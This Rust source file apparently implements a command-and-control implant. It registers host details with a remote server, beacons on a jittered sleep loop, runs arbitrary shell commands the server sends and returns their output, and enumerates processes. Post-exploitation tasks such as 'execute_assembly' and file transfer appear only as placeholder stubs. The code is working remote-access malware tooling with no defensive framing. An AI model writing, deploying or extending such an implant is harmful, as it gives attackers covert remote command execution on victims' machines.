use std::time::Duration;

use rand::Rng;
use tracing::{debug, info, warn};

use crate::config::Config;
use crate::error::Error;
use crate::executor::CommandExecutor;
use crate::system_info::SystemInfo;
use crate::transport::{Task, Transport};
use serde::Deserialize;

pub struct Agent<T: Transport, E: CommandExecutor> {
    config: Config,
    transport: T,
    executor: E,
    id: Option<String>,
}

use serde::{Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEntry {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
}

impl<T: Transport, E: CommandExecutor> Agent<T, E> {
    pub fn new(
        config: Config,
        transport: T,
        executor: E,
    ) -> Self {
        Self {
            config,
            transport,
            executor,
            id: None,
        }
    }

    pub fn run(mut self) {
        self.register_with_retry();

        info!(
            id = %self.id.as_deref().unwrap_or("?"),
            "starting beacon loop"
        );

        loop {
            std::thread::sleep(
                self.next_sleep(),
            );

            self.beacon();
        }
    }

    fn register_with_retry(&mut self) {
        let info = SystemInfo::gather();

        loop {
            match self.transport.register(&info) {
                Ok(id) => {
                    info!(
                        %id,
                        "registered with server"
                    );

                    self.id = Some(id);

                    return;
                }

                Err(e) => {
                    warn!(
                        error = %e,
                        "registration failed, retrying"
                    );

                    std::thread::sleep(
                        self.config.retry_delay,
                    );
                }
            }
        }
    }

    fn beacon(&self) {
        let id = match self.id.clone() {
            Some(id) => id,

            None => {
                warn!(
                    "not registered yet"
                );

                return;
            }
        };

        let task =
            match self.transport.get_task(&id) {
                Ok(task) => task,

                Err(e) => {
                    warn!(
                        error = %e,
                        "task check failed"
                    );

                    return;
                }
            };

        let output =
            self.dispatch_task(task);

        if let Err(e) =
            self.transport.send_result(
                &id,
                &output,
            )
        {
            warn!(
                error = %e,
                "failed to send result"
            );
        }
    }

    fn dispatch_task(
        &self,
        task: Task,
    ) -> String {
        match task.task_type.as_str() {

            "none" => {
                String::new()
            }

            "shell" => {
                let command =
                    match task.command {
                        Some(command)
                        if !command.is_empty() =>
                            {
                                command
                            }

                        _ => {
                            return
                                "shell task has no command"
                                    .into();
                        }
                    };

                debug!(
                    command = %command,
                    "dispatching shell task"
                );

                match self.executor.execute(
                    &command,
                ) {
                    Ok(output) => output,

                    Err(e) => {
                        format!("error: {e}")
                    }
                }
            }

            "process_tree" => {
                debug!(
                    "process_tree task received"
                );

                self.collect_process_tree()
            }

            "payload" => {
                let payload_id =
                    task.payload_id
                        .unwrap_or_else(
                            || "unknown".into(),
                        );

                debug!(
                    payload_id = %payload_id,
                    "payload task received"
                );

                format!(
                    "type=payload payload_id={}",
                    payload_id
                )
            }

            "process" => {
                debug!("process tree task received");

                match collect_processes() {
                    Ok(output) => output,

                    Err(e) => {
                        format!("process enumeration error: {e}")
                    }
                }
            }

            "execute_assembly" => {
                let payload_id =
                    task.payload_id
                        .unwrap_or_else(
                            || "unknown".into(),
                        );

                debug!(
                    payload_id = %payload_id,
                    "execute_assembly task received"
                );

                format!(
                    "type=execute_assembly payload_id={}",
                    payload_id
                )
            }

            "file_upload" => {
                let payload_id =
                    task.payload_id
                        .unwrap_or_else(
                            || "unknown".into(),
                        );

                format!(
                    "type=file_upload payload_id={}",
                    payload_id
                )
            }

            "file_download" => {
                let payload_id =
                    task.payload_id
                        .unwrap_or_else(
                            || "unknown".into(),
                        );

                format!(
                    "type=file_download payload_id={}",
                    payload_id
                )
            }

            "sleep" => {
                "type=sleep".into()
            }

            other => {
                format!(
                    "unsupported task type: {}",
                    other
                )
            }
        }
    }

    fn collect_process_tree(&self) -> String {
        #[cfg(windows)]
        {
            let command = r#"powershell.exe -NoProfile -NonInteractive -Command "$ErrorActionPreference='Stop'; Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name | ConvertTo-Json -Compress""#;

            match self.executor.execute(
                command,
            ) {
                Ok(output) => output,

                Err(e) => {
                    format!(
                        r#"{{"error":"{}"}}"#,
                        escape_json(
                            &e.to_string()
                        )
                    )
                }
            }
        }

        #[cfg(not(windows))]
        {
            let command =
                "ps -eo pid=,ppid=,comm= --no-headers";

            match self.executor.execute(
                command,
            ) {
                Ok(output) => output,

                Err(e) => {
                    format!(
                        "process enumeration error: {}",
                        e
                    )
                }
            }
        }
    }

    fn next_sleep(&self) -> Duration {
        let jitter =
            self.config.jitter;

        if jitter <= 0.0 {
            return self.config.sleep;
        }

        let factor: f64 =
            rand::thread_rng().gen();

        apply_jitter(
            self.config.sleep,
            jitter,
            factor,
        )
    }
}
fn collect_processes() -> Result<String, Error> {
    #[cfg(windows)]
    {
        let output = std::process::Command::new("powershell")
            .args([
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                r#"
Get-CimInstance Win32_Process |
    Select-Object Name,ProcessId,ParentProcessId |
    ConvertTo-Json -Compress
"#,
            ])
            .output()
            .map_err(|e| Error::Command(e.to_string()))?;

        if !output.status.success() {
            return Err(Error::Command(
                String::from_utf8_lossy(&output.stderr).to_string(),
            ));
        }

        let stdout =
            String::from_utf8_lossy(&output.stdout).trim().to_string();

        if stdout.is_empty() {
            return Ok("[]".to_string());
        }

        let json = if stdout.starts_with('[') {
            stdout
        } else {
            format!("[{}]", stdout)
        };

        let processes: Vec<ProcessEntry> =
            serde_json::from_str(&json)
                .map_err(|e| Error::Command(e.to_string()))?;

        return serde_json::to_string(&processes)
            .map_err(|e| Error::Command(e.to_string()));
    }

    #[cfg(not(windows))]
    {
        Err(Error::Command(
            "process enumeration is not implemented for this platform"
                .to_string(),
        ))
    }
}

fn apply_jitter(
    base: Duration,
    jitter: f64,
    factor: f64,
) -> Duration {
    let multiplier =
        1.0
            - jitter
            + 2.0
            * jitter
            * factor.clamp(0.0, 1.0);

    base.mul_f64(multiplier)
}

fn escape_json(value: &str) -> String {
    value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}